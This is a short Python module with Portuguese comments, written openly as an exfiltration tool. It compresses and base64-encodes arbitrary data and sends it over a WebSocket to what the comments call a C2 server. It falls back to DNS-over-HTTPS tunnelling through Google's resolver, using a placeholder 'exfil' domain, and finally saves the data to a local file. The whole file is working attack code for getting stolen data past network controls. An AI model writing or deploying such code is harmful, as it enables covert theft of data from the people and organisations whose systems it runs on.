import base64
import gzip
import json
import websocket
import os

def send_exfiltration(data):
    try:
        print("[📤] Exfiltrando dados via WebSocket...")

        # ✅ Compacta e codifica os dados
        compressed = gzip.compress(data.encode())
        payload_b64 = base64.b64encode(compressed).decode()

        # Monta o pacote JSON
        payload = json.dumps({
            "data": payload_b64
        })

        # Envia via WebSocket
        ws = websocket.WebSocket()
        ws.connect("ws://localhost:5000/ws")  # ou IP do seu servidor C2
        ws.send(payload)
        ws.close()

        print("[✅] Dados enviados com sucesso via WebSocket.")
    except Exception as e:
        print(f"[❌] WebSocket falhou: {e}")
        exfiltrate_via_doh(data)  # fallback

def exfiltrate_via_doh(data):
    import requests

    try:
        print("[🛡️] Fallback: enviando via DNS-over-HTTPS...")

        compressed = gzip.compress(data.encode())
        encoded = base64.b64encode(compressed).decode()

        # ⚠️ Customiza seu domínio aqui
        domain = "exfil.yourdomain.com"
        url = f"https://dns.google/resolve?name={encoded}.{domain}&type=TXT"

        r = requests.get(url)
        print("[📡] Exfiltração DoH enviada com status:", r.status_code)

    except Exception as e:
        print(f"[‼️] Falha total na exfiltração: {e}")
        fallback_save_local(data)

def fallback_save_local(data):
    try:
        path = os.path.join(os.path.dirname(__file__), "failed_exfil.json")
        with open(path, "w") as f:
            f.write(data)
        print(f"[💾] Backup salvo localmente em {path}")
    except Exception as e:
        print(f"[❌] Falha ao salvar localmente: {e}")
